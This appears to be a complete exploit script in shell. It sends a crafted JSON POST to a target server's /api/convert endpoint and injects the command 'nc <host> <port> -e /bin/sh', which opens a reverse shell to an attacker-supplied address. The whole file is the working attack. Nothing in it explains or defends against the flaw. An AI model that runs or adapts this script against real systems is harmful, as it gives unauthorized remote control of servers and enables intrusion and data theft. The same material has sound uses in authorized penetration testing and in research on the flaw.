#!/bin/sh
set -e

if [ "$#" -ne "3" ]; then
	echo "usage: $0 <server address> <reverse shell address> <reverse shell port>"
	exit 1
fi

curl -X POST -H "Content-Type: application/json" "$1/api/convert" --data "{\"mode\":\".Command\",\"exe\":\"nc $2 $3 -e /bin/sh\"}"
